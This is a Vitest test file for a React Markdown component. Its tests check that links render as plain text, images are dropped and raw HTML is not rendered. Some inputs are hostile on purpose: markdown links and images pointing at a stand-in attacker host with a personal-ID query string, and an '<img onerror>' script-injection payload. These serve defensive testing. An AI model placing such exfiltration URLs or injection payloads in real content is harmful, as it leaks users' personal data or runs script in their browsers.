// @vitest-environment jsdom
import { MantineProvider } from "@mantine/core"
import { cleanup, render, screen } from "@testing-library/react"
import { afterEach, beforeAll, describe, expect, it } from "vitest"
import Markdown from "./Markdown.component"

// jsdom has no matchMedia, which Mantine reads for the color scheme, nor ResizeObserver, of the scroll of the tables
beforeAll(() => {
    window.ResizeObserver ??= class {
        observe() {}
        unobserve() {}
        disconnect() {}
    }
    window.matchMedia ??= (query: string) => ({
        matches: false,
        media: query,
        onchange: null,
        addListener: () => {},
        removeListener: () => {},
        addEventListener: () => {},
        removeEventListener: () => {},
        dispatchEvent: () => false
    })
})

afterEach(() => cleanup())

function renderMarkdown(markdown: string) {
    // Without the style tags of Mantine, so the text of the container is only the one of the Markdown
    return render(
        <MantineProvider withCssVariables={false} withGlobalClasses={false}>
            <Markdown>{markdown}</Markdown>
        </MantineProvider>
    )
}

describe("Markdown", () => {
    it("shows the formatting without its symbols", () => {
        const { container } = renderMarkdown("**João** tem a faixa *azul*")

        expect(container.textContent).toBe("João tem a faixa azul")
        expect(screen.getByText("João").style.fontWeight).not.toBe("")
    })

    it("shows a table of GitHub Flavored Markdown", () => {
        renderMarkdown("| Nome | Faixa |\n| --- | --- |\n| João | Azul |")

        expect(screen.getByRole("table")).toBeTruthy()
        expect(screen.getByRole("columnheader", { name: "Faixa" })).toBeTruthy()
        expect(screen.getByRole("cell", { name: "Azul" })).toBeTruthy()
    })

    it("shows the lists", () => {
        renderMarkdown("- João\n- Maria")

        expect(screen.getAllByRole("listitem").map(item => item.textContent)).toEqual(["João", "Maria"])
    })

    it("shows a link as its text, without the URL", () => {
        const { container } = renderMarkdown("Veja o [site](https://attacker.example.com/?cpf=111)")

        expect(screen.queryByRole("link")).toBeNull()
        expect(container.textContent).toBe("Veja o site")
    })

    it("shows a bare URL as text, not as a link", () => {
        const { container } = renderMarkdown("Veja https://example.com")

        expect(screen.queryByRole("link")).toBeNull()
        expect(container.textContent).toBe("Veja https://example.com")
    })

    it("drops the images, which would load a URL by themselves", () => {
        const { container } = renderMarkdown("Veja ![dados](https://attacker.example.com/?cpf=111)")

        expect(container.querySelector("img")).toBeNull()
        expect(container.textContent).not.toContain("attacker")
    })

    it("does not render raw HTML", () => {
        const { container } = renderMarkdown("Olá <img src=x onerror=alert(1)> <b>mundo</b>")

        expect(container.querySelector("img")).toBeNull()
        expect(container.querySelector("b")).toBeNull()
    })

    it("shows a block of code as text", () => {
        const { container } = renderMarkdown("```\nconst a = 1\n```")

        expect(container.querySelector("pre")?.textContent).toBe("const a = 1\n")
    })
})
